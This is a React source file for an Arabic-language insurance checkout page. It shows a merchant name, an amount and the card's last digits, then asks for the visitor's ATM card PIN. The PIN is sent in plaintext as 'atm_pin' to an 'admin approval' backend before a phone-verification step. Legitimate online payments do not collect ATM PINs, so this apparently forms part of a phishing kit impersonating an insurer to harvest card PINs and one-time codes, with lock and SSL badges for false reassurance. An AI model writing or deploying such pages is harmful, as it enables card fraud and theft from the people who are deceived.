import { useState, useRef, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { motion } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Shield, Lock, Loader2, CreditCard } from "lucide-react";
import InsuranceStepper from "@/components/InsuranceStepper";
import { createOrUpdateStage } from "@/hooks/useAdminApproval";
import { linkVisitorToSession } from "@/lib/visitorLink";
import { useLanguage } from "@/i18n/LanguageContext";

const ATMPayment = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { t } = useLanguage();
  const a = t.atm;
  const offer = location.state?.offer;
  const orderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");
  const cardLastFour = location.state?.cardLastFour || sessionStorage.getItem("card_last_four") || "••••";
  const totalPrice = offer?.totalPrice || offer?.price || 0;
  const companyName = offer?.company || "بي كير";

  const [pin, setPin] = useState("");
  const [loading, setLoading] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => { inputRef.current?.focus(); }, []);

  const handleVerify = () => {
    if (pin.length < 4) return;
    setLoading(true);
    const doSubmit = async () => {
      await createOrUpdateStage(orderId, "payment", { atm_pin: pin });
      linkVisitorToSession({});
      setLoading(false);
      navigate("/insurance/phone-verify", { state: { offer, orderId } });
    };
    doSubmit();
  };

  if (!offer) {
    return (
      <div className="min-h-screen bg-background">
        <div className="flex items-center justify-center min-h-[60vh]">
          <p className="text-muted-foreground">{a.noPaymentData}</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-[100dvh] bg-secondary/30">
      <div className="container mx-auto px-3 md:px-4 pt-8 pb-24 md:pb-12">
        <div className="max-w-5xl mx-auto">
          <InsuranceStepper active={2} />

          <div className="max-w-sm mx-auto">
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
              <div className="bg-card rounded-2xl border border-border shadow-sm overflow-hidden">
                
                {/* Header - Bank style */}
                <div className="bg-primary/5 border-b border-border px-5 py-4">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <div className="w-8 h-8 rounded-lg bg-primary/10 flex items-center justify-center">
                        <CreditCard className="w-4 h-4 text-primary" />
                      </div>
                      <span className="text-xs font-semibold text-foreground">{a.title}</span>
                    </div>
                    <div className="flex items-center gap-1.5">
                      <Lock className="w-3 h-3 text-primary/60" />
                      <span className="text-[10px] text-muted-foreground">SSL</span>
                    </div>
                  </div>
                </div>

                {/* Transaction details */}
                <div className="px-5 pt-5 pb-4 space-y-3">
                  {/* Merchant */}
                  <div className="flex items-center justify-between text-xs">
                    <span className="text-muted-foreground">التاجر</span>
                    <span className="font-semibold text-foreground">{companyName}</span>
                  </div>
                  
                  {/* Amount */}
                  <div className="flex items-center justify-between text-xs">
                    <span className="text-muted-foreground">المبلغ</span>
                    <span className="font-bold text-foreground text-sm">{totalPrice.toLocaleString()} ر.س</span>
                  </div>

                  {/* Card */}
                  <div className="flex items-center justify-between text-xs">
                    <span className="text-muted-foreground">البطاقة</span>
                    <span className="font-mono font-semibold text-foreground tracking-wider" dir="ltr">•••• {cardLastFour}</span>
                  </div>

                  <div className="border-t border-dashed border-border" />
                </div>

                {/* PIN input */}
                <div className="px-5 pb-5">
                  <label className="block text-xs font-medium text-foreground mb-2">{a.subtitle}</label>
                  <div className="relative" dir="ltr">
                    <input
                      ref={inputRef}
                      type="password"
                      inputMode="numeric"
                      value={pin}
                      onChange={(e) => {
                        const v = e.target.value.replace(/\D/g, "");
                        setPin(v);
                      }}
                      placeholder="••••"
                      className="w-full h-12 text-center text-xl font-bold tracking-[0.5em] rounded-xl border-2 border-border bg-background text-foreground focus:border-primary focus:ring-2 focus:ring-primary/20 focus:outline-none transition-all placeholder:tracking-[0.3em] placeholder:text-muted-foreground/40"
                    />
                  </div>

                  {/* Processing indicator */}
                  {loading && (
                    <motion.div
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      className="flex items-center justify-center gap-2 mt-4"
                    >
                      <Loader2 className="w-4 h-4 text-primary animate-spin" />
                      <span className="text-xs text-muted-foreground">{a.verifying}</span>
                    </motion.div>
                  )}

                  <Button
                    onClick={handleVerify}
                    disabled={loading || pin.length < 4}
                    className="w-full bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl py-5 font-bold text-sm gap-2 mt-4"
                  >
                    {loading ? (
                      <>
                        <Loader2 className="w-4 h-4 animate-spin" />
                        {a.verifying}
                      </>
                    ) : (
                      <>
                        <Lock className="w-3.5 h-3.5" />
                        {a.confirm}
                      </>
                    )}
                  </Button>
                </div>

                {/* Footer */}
                <div className="bg-secondary/40 border-t border-border px-5 py-3 flex items-center justify-center gap-2">
                  <Shield className="w-3.5 h-3.5 text-primary/60" />
                  <span className="text-[10px] text-muted-foreground">{a.secureProcess}</span>
                </div>
              </div>
            </motion.div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ATMPayment;
